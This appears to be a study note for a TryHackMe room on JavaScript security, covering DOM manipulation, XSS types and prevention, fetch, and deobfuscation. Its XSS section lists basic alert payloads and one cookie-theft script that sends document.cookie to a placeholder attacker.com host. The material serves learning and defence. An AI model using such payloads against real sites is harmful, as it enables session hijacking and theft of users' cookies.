---
tags: [THM, cyber-security-101, web-hacking, JavaScript, XSS, room]
platform: TryHackMe
type: room
module: "08 - Web Hacking"
module_number: 8
room_number: 31
status: "⬜"
url: https://tryhackme.com/room/javascriptessentials
difficulty: Easy
---

# 📜 JavaScript Essentials

> [!abstract] Summary
> Learn JavaScript fundamentals from a security perspective — DOM manipulation, AJAX, and how JavaScript is abused in XSS attacks, obfuscation, and malicious scripts.

**Path:** [[Cyber Security 101]] > Module 8 > JavaScript Essentials

## 🎯 Learning Objectives
- Understand JavaScript syntax and DOM manipulation
- Know how JS is used in web attacks (XSS)
- Deobfuscate JavaScript
- Understand AJAX and fetch API

## 📖 Key Concepts

### JavaScript Basics
```javascript
// Variables
let name = "Alice";
const PI = 3.14;

// Functions
function greet(name) {
    return `Hello, ${name}!`;
}

// Arrow function
const add = (a, b) => a + b;

// Loops
for (let i = 0; i < 5; i++) { console.log(i); }

// Events
document.getElementById("btn").addEventListener("click", function() {
    alert("Clicked!");
});
```

### DOM Manipulation
```javascript
document.getElementById("id")
document.querySelector(".class")
document.createElement("div")
element.innerHTML = "<b>text</b>"   // Dangerous! XSS vector
element.textContent = "safe text"   // Safe
```

### XSS (Cross-Site Scripting)
Injecting malicious JS into pages served to other users.

**Types:**
| Type | Persistence | Vector |
|------|-------------|--------|
| Reflected | No | URL parameter echoed in page |
| Stored | Yes | DB-stored input rendered for others |
| DOM-based | No | Client-side JS processes URL data |

**Basic XSS payloads:**
```javascript
<script>alert(1)</script>
<img src=x onerror="alert(1)">
<svg onload="alert(1)">

// Cookie theft
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

**Prevention:**
- Encode output: `<` → `&lt;`
- Use `textContent` not `innerHTML`
- Content Security Policy (CSP)
- HttpOnly cookies (blocks JS access)

### AJAX / Fetch
```javascript
fetch('/api/user')
  .then(r => r.json())
  .then(data => console.log(data));
```

### Deobfuscation
```javascript
// Obfuscated: eval(atob("YWxlcnQoMSk="))
// Deobfuscate: atob("YWxlcnQoMSk=") → "alert(1)"
// Use: CyberChef → From Base64
// Or: browser console → paste and inspect without eval()
```

> [!warning] Never `eval()` unknown input — it executes arbitrary code. Look for `eval`, `setTimeout(string)`, `Function(string)` as obfuscation entry points in malware analysis.

## 🔑 Key Takeaways
- XSS = JavaScript injection → leads to session hijacking, phishing, defacement
- `innerHTML` is dangerous; `textContent` is safe
- HttpOnly cookies prevent JS from reading session cookies
- CyberChef is the fastest way to deobfuscate JS

## 🔗 Related Notes
- [[CS101-30 - Web Application Basics]] · [[CS101-33 - Burp Suite The Basics]]
- [[XSS]] · [[DOM]] · [[JavaScript]] · [[Cookie Theft]] · [[CS101-47 - CyberChef The Basics]]
